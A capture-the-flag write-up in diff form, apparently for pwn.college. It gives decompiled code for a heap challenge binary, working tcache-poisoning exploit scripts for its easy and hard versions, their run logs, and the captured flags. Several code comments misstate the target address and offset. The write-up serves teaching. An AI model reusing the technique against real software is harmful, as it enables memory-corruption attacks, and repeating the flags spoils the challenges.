@@ -3300,3 +3300,426 @@ int __fastcall main(int argc, const char **argv, const char **envp)
 }
 ```
 
+
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/seeking-spanless-secrets-easy")
+
+# Setup our target and math
+# Secret is at 0x42230a
+# target_addr is 0x4222f0 (Aligned and no 0x0a whitespace)
+secret_addr = 0x42230a
+target_addr = secret_addr - 16
+offset = secret_addr - target_addr # 26 bytes
+new_secret = b"A" * 16
+
+# Build payload
+payload = b"B" * offset
+payload += new_secret
+
+print(f"[*] Targeting aligned address: {hex(target_addr)}")
+
+# Allocate two chunks
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+# Free them to populate Tcache
+p.sendline(b"free")
+p.sendline(b"1")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"free")
+p.sendline(b"0")
+print(p.recvuntil(b"quit): ").decode())
+
+# Poison the 'next' pointer
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(target_addr))
+print(p.recvuntil(b"quit): ").decode())
+
+# Malloc twice to get the chunk at our target address
+p.sendline(b"malloc")
+p.sendline(b"2") 
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"3") 
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+# Overwrite the secret area
+# Junk padding + our controlled secret
+p.sendline(b"scanf")
+p.sendline(b"3")
+p.sendline(payload)
+print(p.recvuntil(b"quit): ").decode())
+
+# Send the flag with our known secret
+p.sendline(b"send_flag")
+p.sendline(new_secret)
+
+# Print final result
+print(p.recvuntil(b"}").decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~seeking-spanless-secrets-easy:/$ python ~/script.py
+[+] Starting local process '/challenge/seeking-spanless-secrets-easy': pid 8821
+[*] Targeting aligned address: 0x4222fa
+###
+### Welcome to /challenge/seeking-spanless-secrets-easy!
+###
+
+This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
+challenges, you will become familiar with the concept of heap exploitation.
+
+This challenge can manage up to 16 unique allocations.
+
+In this challenge, there is a secret stored at 0x42230a.
+This address intentionally uses `whitespace-armoring` (notice the 0x0a in the address).
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[0] = malloc(128)
+[*] allocations[0] = 0x15a6a2c0
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[1] = malloc(128)
+[*] allocations[1] = 0x15a6a350
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] free(allocations[1])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x15a6a350           | KEY: 0x15a6a010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x15a6a350          | 0                   | 0x91 (P)                     | (nil)               | 0x15a6a010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] free(allocations[0])
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x15a6a2c0           | KEY: 0x15a6a010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x15a6a2c0          | 0                   | 0x91 (P)                     | 0x15a6a350          | 0x15a6a010          |
+| 0x15a6a350          | 0                   | 0x91 (P)                     | (nil)               | 0x15a6a010          |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] scanf("%136s", allocations[0])
+
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 2     | HEAD: 0x15a6a2c0           | KEY: 0x15a6a010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x15a6a2c0          | 0                   | 0x91 (P)                     | 0x4222fa            | 0x15a6a000          |
+| 0x4222fa            | 0                   | 0 (NONE)                     | (nil)               | (nil)               |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[2] = malloc(128)
+[*] allocations[2] = 0x15a6a2c0
++====================+========================+==============+============================+============================+
+| TCACHE BIN #7      | SIZE: 121 - 136        | COUNT: 1     | HEAD: 0x4222fa             | KEY: 0x15a6a010            |
++====================+========================+==============+============================+============================+
+| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
++---------------------+---------------------+------------------------------+---------------------+---------------------+
+| 0x4222fa            | 0                   | 0 (NONE)                     | (nil)               | (nil)               |
++----------------------------------------------------------------------------------------------------------------------+
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+[*] allocations[3] = malloc(128)
+[*] allocations[3] = 0x4222fa
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+[*] scanf("%0s", allocations[3])
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{UXoETFJzikCNvh66nGl1nVtHrJT.0VN4MDL4ITM0EzW}
+```
+
+&nbsp;
+
+## Seeking Spanless Secrets (Hard)
+
+### Binary Analysis
+
+```c title="/challenge/seeking-spanless-secrets-hard :: main()" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  unsigned int v3; // eax
+  int i; // [rsp+2Ch] [rbp-124h]
+  unsigned int v6; // [rsp+30h] [rbp-120h]
+  unsigned int v7; // [rsp+30h] [rbp-120h]
+  unsigned int v8; // [rsp+30h] [rbp-120h]
+  unsigned int v9; // [rsp+30h] [rbp-120h]
+  unsigned int size; // [rsp+34h] [rbp-11Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
+  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
+  unsigned __int64 v13; // [rsp+148h] [rbp-8h]
+
+  v13 = __readfsqword(40u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 1uLL);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  for ( i = 0; i <= 15; ++i )
+    byte_42580A[i] = rand() % 26 + 97;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            puts(byte_40214C);
+            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_40214C);
+            if ( strcmp(choice, "malloc") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_40214C);
+            v6 = atoi(choice);
+            if ( v6 > 15 )
+              __assert_fail("allocation_index < 16", "<stdin>", 114u, "main");
+            printf("Size: ");
+            __isoc99_scanf("%127s", choice);
+            puts(byte_40214C);
+            size = atoi(choice);
+            ptr[v6] = malloc(size);
+          }
+          if ( strcmp(choice, "free") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", choice);
+          puts(byte_40214C);
+          v7 = atoi(choice);
+          if ( v7 > 15 )
+            __assert_fail("allocation_index < 16", "<stdin>", 130u, "main");
+          free(ptr[v7]);
+        }
+        if ( strcmp(choice, "puts") )
+          break;
+        printf("Index: ");
+        __isoc99_scanf("%127s", choice);
+        puts(byte_40214C);
+        v8 = atoi(choice);
+        if ( v8 > 15 )
+          __assert_fail("allocation_index < 16", "<stdin>", 142u, "main");
+        printf("Data: ");
+        puts((const char *)ptr[v8]);
+      }
+      if ( strcmp(choice, "scanf") )
+        break;
+      printf("Index: ");
+      __isoc99_scanf("%127s", choice);
+      puts(byte_40214C);
+      v9 = atoi(choice);
+      if ( v9 > 15 )
+        __assert_fail("allocation_index < 16", "<stdin>", 154u, "main");
+      v3 = malloc_usable_size(ptr[v9]);
+      sprintf(choice, "%%%us", v3);
+      __isoc99_scanf(choice, ptr[v9]);
+      puts(byte_40214C);
+    }
+    if ( strcmp(choice, "send_flag") )
+      break;
+    printf("Secret: ");
+    __isoc99_scanf("%127s", choice);
+    puts(byte_40214C);
+    if ( !memcmp(choice, byte_42580A, 16uLL) )
+    {
+      puts("Authorized!");
+      win();
+    }
+    else
+    {
+      puts("Not authorized!");
+    }
+  }
+  if ( strcmp(choice, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+### Exploit
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/seeking-spanless-secrets-hard")
+
+# Setup our target and math
+# Secret is at 0x42580a
+# target_addr is 0x4257fa (Aligned and no 0x0a whitespace)
+secret_addr = 0x42580a
+target_addr = secret_addr - 16
+offset = secret_addr - target_addr # 26 bytes
+new_secret = b"A" * 16
+
+# Build payload
+payload = b"B" * offset
+payload += new_secret
+
+print(f"[*] Targeting aligned address: {hex(target_addr)}")
+
+# Allocate two chunks
+p.sendline(b"malloc")
+p.sendline(b"0")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"1")
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+# Free them to populate Tcache
+p.sendline(b"free")
+p.sendline(b"1")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"free")
+p.sendline(b"0")
+print(p.recvuntil(b"quit): ").decode())
+
+# Poison the 'next' pointer
+p.sendline(b"scanf")
+p.sendline(b"0")
+p.sendline(p64(target_addr))
+print(p.recvuntil(b"quit): ").decode())
+
+# Malloc twice to get the chunk at our target address
+p.sendline(b"malloc")
+p.sendline(b"2") 
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+p.sendline(b"malloc")
+p.sendline(b"3") 
+p.sendline(b"128")
+print(p.recvuntil(b"quit): ").decode())
+
+# Overwrite the secret area
+# Junk padding + our controlled secret
+p.sendline(b"scanf")
+p.sendline(b"3")
+p.sendline(payload)
+print(p.recvuntil(b"quit): ").decode())
+
+# Send the flag with our known secret
+p.sendline(b"send_flag")
+p.sendline(new_secret)
+
+# Print final result
+print(p.recvuntil(b"}").decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~seeking-spanless-secrets-hard:/$ python ~/script.py
+[+] Starting local process '/challenge/seeking-spanless-secrets-hard': pid 1368
+[*] Targeting aligned address: 0x4257fa
+###
+### Welcome to /challenge/seeking-spanless-secrets-hard!
+###
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+Size: 
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+
+Index: 
+
+
+[*] Function (malloc/free/puts/scanf/send_flag/quit): 
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{s3p743_G7uUAFBNkhZiOvvnjaAR.0lN4MDL4ITM0EzW}
+```
